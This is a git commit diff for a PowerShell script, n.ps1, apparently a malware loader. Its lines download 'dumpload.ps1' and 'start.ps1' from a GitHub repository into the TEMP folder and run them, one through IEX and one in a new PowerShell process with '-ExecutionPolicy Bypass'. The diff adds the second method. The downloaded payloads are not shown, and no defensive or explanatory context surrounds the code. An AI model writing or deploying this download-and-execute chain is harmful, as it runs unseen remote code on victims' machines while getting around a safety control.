07aaacee4438ad8fc2e632674cc68ed0a0382a59
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-05-01 20:43:37 +0700

    Update n.ps1

--- n.ps1
+++ n.ps1
@@ -2,7 +2,21 @@ $url6 = "https://raw.githubusercontent.com/cia168168/folder/main/dumpload.ps1"
 $output6 = "$env:TEMP\dump.ps1"
 Invoke-WebRequest -Uri $url6 -OutFile $output6
 IEX (Get-Content $output6 | Out-String)
-$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/start.ps1"
-$output5 = "$env:TEMP\start.ps1"
-Invoke-WebRequest -Uri $url5 -OutFile $output5
-IEX (Get-Content $output5 | Out-String)
+# URL of the PowerShell script to download
+$url = "https://raw.githubusercontent.com/cia168168/folder/main/start.ps1"
+# Output path for downloaded script
+$output = "$env:TEMP\start.ps1"
+
+# Download the PowerShell script
+Invoke-WebRequest -Uri $url -OutFile $output
+
+# Open a new PowerShell process
+$psProcess = New-Object System.Diagnostics.ProcessStartInfo
+$psProcess.FileName = "powershell.exe"
+$psProcess.Arguments = "-ExecutionPolicy Bypass -File $output"
+
+# Start the process
+$process = [System.Diagnostics.Process]::Start($psProcess)
+
+# Wait for the process to finish
+$process.WaitForExit()
